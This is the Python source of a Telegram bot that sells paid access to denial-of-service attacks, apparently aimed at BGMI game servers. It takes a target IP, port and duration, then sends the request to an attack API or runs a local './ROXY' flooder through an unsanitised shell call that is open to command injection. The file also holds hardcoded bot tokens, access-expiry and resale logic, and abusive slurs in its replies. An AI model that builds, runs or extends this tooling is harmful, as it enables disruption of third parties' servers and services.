 telebot
import subprocess
import datetime
import os
import requests
import json
import logging
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Insert your Telegram bot token here
bot = telebot.TeleBot('7660887190:AAGSRnUfM0EkabRy22tMeKxAKQu9LzPTHN0')

# API Configuration - HIDDEN FROM USERS
API_URL = os.getenv("API_URL", "http://localhost:3000")  # Default API URL
API_KEY = os.getenv("API_KEY", "")  # Your API key

# Blocked ports (must match backend)
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Allowed port range
MIN_PORT = 1
MAX_PORT = 65535

# Admin user IDs
admin_id = {"7352008650"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# API Functions - URL never shown to users
def check_api_health():
    """Check API health status - For internal use only"""
    try:
        response = requests.get(
            f"{API_URL}/api/v1/health",
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            return response.json()
        else:
            return {"status": "error", "error": f"HTTP {response.status_code}"}
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {"status": "error", "error": "Connection failed"}

def check_running_attacks():
    """Check running attacks - For internal use only"""
    try:
        response = requests.get(
            f"{API_URL}/api/v1/active",
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            return response.json()
        else:
            return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        logger.error(f"Running attacks error: {e}")
        return {"success": False, "error": "Service unavailable"}

def launch_attack_api(ip, port, duration):
    """Launch attack via API - For internal use only"""
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return response.json()
    except Exception as e:
        logger.error(f"Attack launch error: {e}")
        return {"error": "Service unavailable", "success": False}

def is_port_blocked(port):
    """Check if port is in blocked list"""
    return port in BLOCKED_PORTS

def get_blocked_ports_list():
    """Get formatted list of blocked ports"""
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
            else:
                file.truncate(0)
                response = "log saaf ho gae "
    except FileNotFoundError:
        response = "Saaf karane ke lie koee Log nahin mila."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Thik se daal bsdk. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 🔥."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🔥."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 🔥."
    else:
        response = "Mood ni hai abhi pelhe purchase kar isse:- @Roxz_gaming."

    bot.reply_to(message , response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"🔥 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n👤 Username: {username}\n📋 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏰ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 🔥."
            else:
                response = f"User {user_to_remove} not found in the list 🔥."
        else:
            response = '''Please Specify A User ID to Remove. 
🔥 Usage: /remove <userid>'''
    else:
        response = "Purchase karle bsdk:- @Roxz_gaming 🔥."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Log pahale hee saaf kar die gae hain. daata praapt nahin hua ."
                else:
                    file.truncate(0)
                    response = "log saaf ho gae "
        except FileNotFoundError:
            response = "Saaf karane ke lie koee Log nahin mila ."
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "KOI DATA NHI HAI "
        except FileNotFoundError:
            response = "KOI DATA NHI HAI "
    else:
        response = "BhenChod Owner na HAI TU LODE."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "KOI DATA NHI HAI ."
                bot.reply_to(message, response)
        else:
            response = "KOI DATA NHI HAI "
            bot.reply_to(message, response)
    else:
        response = "BhenChod Owner na HAI TU LODE."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# New command to check API status (admin only) - URL HIDDEN
@bot.message_handler(commands=['apistatus'])
def api_status_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        status_msg = bot.reply_to(message, "🔄 Checking API health status...")
        
        health = check_api_health()
        
        if health.get("status") == "ok":
            response = (
                f"✅ API Status: ONLINE\n\n"
                f"🕐 Timestamp: {health.get('timestamp', 'N/A')}\n"
                f"📦 Version: {health.get('version', 'N/A')}"
                # URL is intentionally NOT shown here
            )
        else:
            response = (
                f"❌ API Status: OFFLINE\n\n"
                f"Error: Unable to connect to attack server"
                # URL is intentionally NOT shown here
            )
        
        bot.edit_message_text(response, message.chat.id, status_msg.message_id)
    else:
        bot.reply_to(message, "BhenChod Owner na HAI TU LODE.")

# New command to check running attacks (admin only) - URL HIDDEN
@bot.message_handler(commands=['running'])
def running_attacks_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        status_msg = bot.reply_to(message, "🔄 Fetching active attacks...")
        
        attacks = check_running_attacks()
        
        if attacks.get("success"):
            active_attacks = attacks.get("activeAttacks", [])
            if active_attacks:
                response = f"🎯 Active Attacks ({len(active_attacks)})\n\n"
                for attack in active_attacks:
                    response += (
                        f"🔹 Target: {attack['target']}:{attack['port']}\n"
                        f"   ⏱️ Expires in: {attack['expiresIn']}s\n"
                        f"   🆔 ID: {attack['attackId'][:8]}...\n\n"
                    )
            else:
                response = "✅ No active attacks running."
            
            response += f"\n📊 System Limits:\n"
            response += f"   • Current: {attacks.get('count', 0)} / {attacks.get('maxConcurrent', 0)}\n"
            response += f"   • Available slots: {attacks.get('remainingSlots', 0)}"
        else:
            response = f"❌ Failed to fetch active attacks\n\nError: Attack server is currently unavailable"
        
        bot.edit_message_text(response, message.chat.id, status_msg.message_id)
    else:
        bot.reply_to(message, "BhenChod Owner na HAI TU LODE.")

# New command to show blocked ports
@bot.message_handler(commands=['blockedports'])
def blocked_ports_command(message):
    blocked_ports_str = get_blocked_ports_list()
    response = (
        f"🚫 Blocked Ports\n\n"
        f"The following ports are blocked and cannot be used for attacks:\n\n"
        f"{blocked_ports_str}\n\n"
        f"📊 Total blocked: {len(BLOCKED_PORTS)} ports\n\n"
        f"✅ Allowed ports: All ports from {MIN_PORT} to {MAX_PORT} except the blocked ones."
    )
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /attack
def start_attack_reply(message, target, port, time, attack_data=None):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    if attack_data and attack_data.get('success'):
        response = (
            f"✅ Attack Launched Successfully!\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {time} seconds\n"
            f"🆔 Attack ID: {attack_data.get('attack', {}).get('id', 'N/A')[:8]}...\n"
            f"⏰ Ends At: {attack_data.get('attack', {}).get('endsAt', 'N/A')}\n\n"
            f"SEC Jabtak YE attack run krrha hai to iske bichme koi apni gand nahe Dalna Bhenchod"
        )
    else:
        response = f"attack start : {target}:{port} for {time}\nSEC Jabtak YE attack  run krrha hai to iske bichme koi apni gand nahe Dalna Bhenchod"
    
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /attack command
bgmi_cooldown = {}
COOLDOWN_TIME = 0
attack_running = False

# Handler for /attack command (Modified to use API - URL HIDDEN)
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_running
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        response = "BHEN KA LAND OKAAT MATT BHULL APNA ."
        bot.reply_to(message, response)
        return
    
    # Check if user's approval has expired
    if user_id in user_approval_expiry:
        if user_approval_expiry[user_id] < datetime.datetime.now():
            response = "❌ Tumhara access expire ho gaya hai. Dobara purchase karo @Roxz_gaming se."
            bot.reply_to(message, response)
            return
    
    command = message.text.split()
    if len(command) == 4:  # Updated to accept target, port, and time
        target = command[1]
        port_str = command[2]
        time_str = command[3]
        
        # Validate port
        try:
            port = int(port_str)
            if port < MIN_PORT or port > MAX_PORT:
                response = f"❌ Invalid port. Must be between {MIN_PORT} and {MAX_PORT}."
                bot.reply_to(message, response)
                return
            
            # Check if port is blocked
            if is_port_blocked(port):
                blocked_ports_str = get_blocked_ports_list()
                response = (
                    f"❌ Port {port} is blocked!\n\n"
                    f"🚫 Blocked ports: {blocked_ports_str}"
                )
                bot.reply_to(message, response)
                return
        except ValueError:
            response = "❌ Invalid port. Please use a number."
            bot.reply_to(message, response)
            return
        
        # Validate time
        try:
            time = int(time_str)
            if time > 240:
                response = "Error: Time interval must be less than 240"
                bot.reply_to(message, response)
                return
        except ValueError:
            response = "❌ Invalid time. Please use a number."
            bot.reply_to(message, response)
            return
        
        # Check if attack is already running (using global flag)
        if attack_running:
            response = "Abhi attack Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
            bot.reply_to(message, response)
            return
        
        # Send initial response
        status_msg = bot.reply_to(message, 
            f"🎯 Launching Attack...\n\n"
            f"Target: {target}:{port}\n"
            f"Duration: {time} seconds\n\n"
            f"🔄 Please wait..."
        )
        
        attack_running = True  # Set the attack state to running
        
        try:
            # Log the command
            record_command_logs(user_id, '/attack', target, port, time)
            log_command(user_id, target, port, time)
            
            # Launch attack via API
            api_response = launch_attack_api(target, port, time)
            
            if api_response.get("success"):
                # Attack launched successfully via API
                attack_data = api_response.get("attack", {})
                limits = api_response.get("limits", {})
                
                response = (
                    f"✅ Attack Launched Successfully!\n\n"
                    f"🎯 Target: {target}:{port}\n"
                    f"⏱️ Duration: {time} seconds\n"
                    f"🆔 Attack ID: {attack_data.get('id', 'N/A')[:8]}...\n"
                    f"⏰ Ends At: {attack_data.get('endsAt', 'N/A')}\n\n"
                    f"SEC Jabtak YE attack run krrha hai to iske bichme koi apni gand nahe Dalna Bhenchod"
                )
                
                # Log success to file
                with open("api_attacks.log", "a") as log_file:
                    log_file.write(f"{datetime.datetime.now()} - User {user_id} - Attack successful - {target}:{port} for {time}s\n")
                
            else:
                # API attack failed, fallback to local binary if available
                error_msg = api_response.get("error", "Unknown error")
                
                # Try local attack as fallback (without showing URL)
                try:
                    full_command = f"./ROXY {target} {port} {time} 1200"
                    subprocess.run(full_command, shell=True)
                    response = (
                        f"✅ Attack completed successfully!\n\n"
                        f"🎯 Target: {target}:{port}\n"
                        f"⏱️ Duration: {time} seconds\n\n"
                        f"SEC Jabtak YE attack run krrha hai to iske bichme koi apni gand nahe Dalna Bhenchod"
                    )
                    
                    # Log fallback to file
                    with open("api_attacks.log", "a") as log_file:
                        log_file.write(f"{datetime.datetime.now()} - User {user_id} - Used local method - {target}:{port} for {time}s\n")
                        
                except Exception as e:
                    response = f"❌ Attack failed. Please try again later."
                    
                    # Log complete failure
                    with open("api_attacks.log", "a") as log_file:
                        log_file.write(f"{datetime.datetime.now()} - User {user_id} - Attack failed - {target}:{port} for {time}s - Error: {str(e)}\n")
            
            bot.edit_message_text(response, message.chat.id, status_msg.message_id)
            
        except Exception as e:
            response = f"❌ An error occurred. Please try again later."
            bot.edit_message_text(response, message.chat.id, status_msg.message_id)
            
            # Log error
            with open("api_attacks.log", "a") as log_file:
                log_file.write(f"{datetime.datetime.now()} - User {user_id} - Error - {target}:{port} for {time}s - Error: {str(e)}\n")
        finally:
            attack_running = False  # Reset the attack state
    else:
        response = "Usage: /attack <target> <port> <time>"
        bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Pehle Buy krke Aao Bhenkelode ❌ ."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
💥 /attack : 😫BGMI WALO KI MAA KO attack🥵. 
💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
💥 /mylogs : 👁️SAB attack DEKHO👁️.
💥 /plan : 💵SABKE BSS KA BAT HAI💵.
💥 /myinfo : 📃APNE PLAN KI VEDHTA DEKHLE LODE📃.
💥 /blockedports : 🚫 Blocked ports list dekho.

👀 To See Admin Commands:
🤖 /admincmd : Shows All Admin Commands.

Buy From :- @Roxz_gaming
Official Channel :- https://t.me/bgmiindiaofficial1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''💥 LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
🤗Try To Run This Command : /help 
💵BUY :-@Roxz_gaming'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules 🔥🔥:

1. Dont Run Too Many attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/bgmiindiaofficial1 OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Ye plan hi kafi hai bgmi ki ma chodne ke liye!!:

Vip 🔥 :
->  Time : 🔥🔥 (S)
> After attack  Limit :10 sec
-> Concurrents attack a : 5

Pr-ice List🔥 :
Day-->OKAT SE BAHAR 
3Day-->OKAT SE BAHAR 
Week-->OKAT SE BAHAR 
Month-->OKAT SE BAHAR 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

➕ /add <userId> : Add a User.
🖕 /remove <userid> Remove a User.
📒 /allusers : Authorised Users Lists.
📃 /logs : All Users Logs.
🔥 /broadcast : Broadcast a Message.
🔥 /clearlogs : Clear The Logs File.
🌐 /apistatus : Check attack server status.
🎯 /running : Check running attacks.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "BhenChod Owner na HAI TU LODE."

    bot.reply_to(message, response)

# Create .env file template if it doesn't exist (with example values)
def create_env_template():
    if not os.path.exists(".env"):
        with open(".env", "w") as f:
            f.write("""# API Configuration - KEEP THESE SECRET!
API_URL=https://api.battle-destroyer.shop
API_KEY=your_api_key_here

# Bot Configuration
BOT_TOKEN=7812894832:AAGGr7F3qfLVQqG1QqHxdQkqR3GpgaBSS-0
""")
        print("✅ Created .env template file. Please update with your actual API credentials.")

# Create .env file on startup
create_env_template()

# Start bot with hidden configuration
print("🤖 Bot is starting...")
print(f"🌐 API: {'Configured' if API_KEY else 'Not configured - Please set API_KEY in .env file'}")
print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
print("✅ Bot is running!")

# Main polling loop with error handling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
        print(f"Error: {e}")
        import time
        time.sleep(5)  # Wait 5 seconds before retrying